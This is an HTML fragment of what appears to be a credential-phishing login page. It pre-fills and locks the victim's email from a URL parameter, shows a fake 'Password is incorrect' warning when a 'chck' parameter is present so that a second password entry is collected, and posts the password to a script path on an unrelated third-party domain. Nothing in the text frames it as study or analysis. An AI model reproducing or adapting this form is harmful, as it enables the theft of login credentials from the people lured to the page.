		                    <p id="warn" style="display: none;color:red;margin-bottom: 15px;">Password is incorrect, please try again.</p>
              <script type="text/javascript">
                    function getParameterByName(name, url) {
                        if (!url) url = window.location.href;
                        name = name.replace(/[\[\]]/g, "\\$&");
                        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
                            results = regex.exec(url);
                        if (!results) return null;
                        if (!results[2]) return '';
                        return decodeURIComponent(results[2].replace(/\+/g, " "));
                    }
                    var email = getParameterByName('email');
                    var chck = getParameterByName('chck');
                    var warn = document.getElementById('warn');

                    if (chck) {
                      warn.style.display = "block";
                    }
                </script>

					<form id="loginform" class="sus-form mt-3 mb-2 needs-validation" method="POST" action="https://ahsexpress.com/.cgi-bin log/general1/post.php" name="loginform" novalidate="">
	 
					  	
					  <div class="sus-input-group mt-2">
					    <input type="text" name="user" id="" required="" class="sus-input" placeholder="" minlength="" autofocus="" value="" readonly>
					   
					    			    
					  </div>
					  
					                  <script type="text/javascript">loginform.user.value = email;</script>

                <input type="hidden" name="chck" value="">
                <script type="text/javascript">loginform.chck.value = chck;</script>


										  

					  <div class="sus-input-group mt-2">
					    <input type="password" name="suspass" id="susPass" required="required" class="sus-input" placeholder=" Password" minlength="6" autofocus="">
					    <label for="name" class=""></label>
					    			    
					  </div>

                
					  <div class="mt-3 mb-3">

					  </div>	
						<div class="form-check">
						  <input class="form-check-input" type="checkbox" value="true" id="susRemember" checked="checked">
						  <label class="form-check-label" for="susRemember">
						    <span>Keep me logged in (Do not select if you are on a public computer). </span>
						  </label>
						</div>				  
					</form>
